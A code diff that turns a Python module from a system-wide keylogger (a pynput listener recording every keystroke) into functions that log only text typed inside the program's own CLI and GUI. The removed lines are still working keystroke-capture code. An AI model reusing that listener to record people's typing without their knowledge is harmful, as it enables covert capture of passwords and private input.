@@ -1,28 +1,23 @@
-from pynput import keyboard
-from src.writer import write_key
-from src.config import STOP_KEY
+# src/logger.py
+"""
+Safe logging functions.
 
-def on_press(key):
-    """
-    Called every time a key is pressed.
-    Logs the key using write_key().
-    If STOP_KEY is set, pressing that key will stop the logger.
-    """
-    write_key(key)
+This is NOT a system-wide keylogger.
+It only logs:
+ - Text typed in the CLI
+ - Keys typed inside the GUI entry widget
+"""
 
-    # Optional stop key
-    if STOP_KEY is not None:
-        try:
-            if key.char == STOP_KEY:
-                return False
-        except:
-            if hasattr(key, "name") and key.name == STOP_KEY:
-                return False
+from src.writer import write_entry
 
-def start_logger():
+def log_text(text: str):
     """
-    Starts the keyboard listener. Runs until manually stopped.
+    Log a single character or special key from the GUI.
     """
-    print("[+] Keylogger started. Press CTRL + C to stop.")
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    write_entry(text)
+
+def log_line(line: str):
+    """
+    Log a full line of text from the CLI.
+    """
+    write_entry(line)
